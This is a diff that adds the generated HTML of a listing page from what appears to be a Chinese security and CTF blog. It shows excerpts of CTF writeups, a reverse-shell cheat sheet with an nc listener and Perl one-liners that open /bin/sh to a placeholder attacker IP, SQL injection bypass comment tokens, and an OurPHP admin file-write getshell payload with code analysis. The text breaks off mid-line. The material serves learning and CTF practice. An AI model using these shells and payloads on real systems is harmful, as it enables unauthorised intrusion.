@@ -1,23 +1,1093 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="mask-icon" href="https://github.com/Windylh/image/raw/master/icon.ico" color="#222">
 
-{% block title %}{{ title }}{% if theme.index_with_subtitle and subtitle %} – {{ subtitle }}{% endif %}{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
-{% block page_class %}
-  {% if is_home() %}page-home{% endif -%}
-{% endblock %}
 
-{% block content %}
-  <section id="posts" class="posts-expand">
-    {% for post in page.posts %}
-      {{ post_template.render(post, true) }}
-    {% endfor %}
-  </section>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-  {% include '_partials/pagination.swig' %}
-{% endblock %}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Windylh&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:locale">
+<meta property="article:author" content="Windylh">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Windylh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Windylh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/09/%E5%8F%8D%E5%BC%B9shell%E5%B0%8F%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/09/09/%E5%8F%8D%E5%BC%B9shell%E5%B0%8F%E7%BB%93/" class="post-title-link" itemprop="url">反弹shell小结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-09-09 00:00:00" itemprop="dateCreated datePublished" datetime="2018-09-09T00:00:00+08:00">2018-09-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-03-09 17:06:53" itemprop="dateModified" datetime="2020-03-09T17:06:53+08:00">2020-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+<h3 id="靶机远程反弹shell"><a href="#靶机远程反弹shell" class="headerlink" title="靶机远程反弹shell"></a>靶机远程反弹shell</h3><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:xxxx&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2018/09/09/%E5%8F%8D%E5%BC%B9shell%E5%B0%8F%E7%BB%93/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/10/Sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/06/10/Sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="post-title-link" itemprop="url">Sql注入绕过姿势</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-06-10 00:00:00" itemprop="dateCreated datePublished" datetime="2018-06-10T00:00:00+08:00">2018-06-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-03-12 14:51:16" itemprop="dateModified" datetime="2020-03-12T14:51:16+08:00">2020-03-12</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>整理一下sql注入的各种绕过姿势，以后做题方便查阅。</p>
+<h3 id="0x00-注释符"><a href="#0x00-注释符" class="headerlink" title="0x00 注释符"></a>0x00 注释符</h3><p>常用注释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">--%20</span><br><span class="line">/**/</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">-- -</span><br><span class="line">%00</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01 大小写绕过"></a>0x01 大小写绕过</h3><p>用于绕过一些对大小写敏感的黑名单匹配</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2018/06/10/Sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/29/SUCTF2018%E9%83%A8%E5%88%86Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/05/29/SUCTF2018%E9%83%A8%E5%88%86Writeup/" class="post-title-link" itemprop="url">SUCTF2018部分Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-05-29 00:00:00" itemprop="dateCreated datePublished" datetime="2018-05-29T00:00:00+08:00">2018-05-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:13" itemprop="dateModified" datetime="2018-11-01T18:53:13+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SandGame"><a href="#SandGame" class="headerlink" title="SandGame"></a>SandGame</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag.flag</span><br><span class="line">sands = <span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sand.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(holes)):</span><br><span class="line">        sand = sands % holes[i]</span><br><span class="line">        f.write(<span class="built_in">str</span>(sand)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2018/05/29/SUCTF2018%E9%83%A8%E5%88%86Writeup/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/07/2018%E5%9B%BD%E8%B5%9Bwriteup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/05/07/2018%E5%9B%BD%E8%B5%9Bwriteup/" class="post-title-link" itemprop="url">2018CISCN初赛Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-05-07 00:00:00" itemprop="dateCreated datePublished" datetime="2018-05-07T00:00:00+08:00">2018-05-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:38" itemprop="dateModified" datetime="2018-11-01T18:53:38+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这次国赛作为一个Web选手倍受打击，web需要pwn师傅，crypto需要反编译，misc需要内核分析，mong男落泪，以后要学习一下二进制知识了。写了几个自己做出来的题的writeup。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="验证码-签到版"><a href="#验证码-签到版" class="headerlink" title="验证码[签到版]"></a>验证码[签到版]</h3><p>开赛的时候以为是机器学习，尝试着随便点了点时间到了就拿到了flag，估计是出了非预期解。</p>
+<h3 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h3><p>图片放入binwalk</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.4.29/misc2-1.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2018/05/07/2018%E5%9B%BD%E8%B5%9Bwriteup/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/27/2017%E6%B9%96%E6%B9%98%E6%9D%AFwriteup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/27/2017%E6%B9%96%E6%B9%98%E6%9D%AFwriteup/" class="post-title-link" itemprop="url">2017湖湘杯Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-27 00:00:00" itemprop="dateCreated datePublished" datetime="2017-11-27T00:00:00+08:00">2017-11-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:52:50" itemprop="dateModified" datetime="2018-11-01T18:52:50+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h3><p>op参数能读取执行功能的php，尝试用位协议读取源码。</p>
+<p><code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
+<p>得到源码</p>
+<p>home.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Welcome</span>!!&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">We</span> <span class="title">let</span> <span class="title">you</span> <span class="title">upload</span> <span class="title">PNG</span> <span class="title">image</span> <span class="title">files</span> <span class="title">and</span> <span class="title">store</span> <span class="title">it</span>!&lt;<span class="title">br</span>/&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Get</span> <span class="title">started</span> <span class="title">by</span> &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">op</span>=<span class="title">upload</span>&quot;&gt;<span class="title">uploading</span> <span class="title">a</span> <span class="title">picture</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>指向common.php</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/11/27/2017%E6%B9%96%E6%B9%98%E6%9D%AFwriteup/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/27/miac%E7%AC%AC%E4%BA%8C%E8%BD%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/27/miac%E7%AC%AC%E4%BA%8C%E8%BD%AE/" class="post-title-link" itemprop="url">Miac2017第二轮Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-27 00:00:00" itemprop="dateCreated datePublished" datetime="2017-11-27T00:00:00+08:00">2017-11-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:30" itemprop="dateModified" datetime="2018-11-01T18:53:30+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>查看源代码<br><code>&lt;input type=&quot;text&quot; maxlength=&quot;3&quot; name=&quot;pass&quot;/&gt;</code><br>提示输入更大的数，并限制了text的maxlength，F12修改html，删除maxlength部分.</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2017.10.30/%E7%AD%BE%E5%88%B0%E9%A2%98.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/11/27/miac%E7%AC%AC%E4%BA%8C%E8%BD%AE/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/Ourphp%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/18/Ourphp%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Ourphp后台getshell漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">2017-09-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:28" itemprop="dateModified" datetime="2018-11-01T18:53:28+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x00-Payload"><a href="#0x00-Payload" class="headerlink" title="0x00 Payload"></a>0x00 Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_filebox.php?op=save&amp;encode=UTF-8&amp;fename=1.php&amp;ncontent=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在登陆后台后，可直接上传文件。</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>&#x2F;ourphp&#x2F;client&#x2F;manage&#x2F;ourphp_filebox.php 694行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$ncontent</span>, <span class="variable">$fename</span>, <span class="variable">$encode</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$meurl</span>,<span class="variable">$folder</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fename</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">maintop</span>(<span class="string">&quot;编辑&quot;</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$folder</span>.<span class="variable">$fename</span>);</span><br><span class="line">    <span class="variable">$ydata</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$ncontent</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$encode</span>!==<span class="string">&quot;UTF-8&quot;</span> &amp;&amp; <span class="variable">$encode</span>!==<span class="string">&quot;ASCII&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$ydata</span> = <span class="title function_ invoke__">iconv</span>(<span class="variable">$encode</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$ydata</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$ydata</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;box&#x27;&gt;文件 &lt;a href=\&quot;&quot;</span>.<span class="variable">$folder</span>.<span class="variable">$fename</span>.<span class="string">&quot;\&quot; target=\&quot;_blank\&quot;&gt;&quot;</span>.<span class="variable">$folder</span>.<span class="variable">$fename</span>.<span class="string">&quot;&lt;/a&gt; 保存成功！\n&quot;</span></span><br><span class="line">            .<span class="string">&quot;请选择 &lt;a href=\&quot;&quot;</span>.<span class="variable">$meurl</span>.<span class="string">&quot;?op=home&amp;folder=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;folder&#x27;</span>].<span class="string">&quot;\&quot;&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\&quot;&quot;</span>.<span 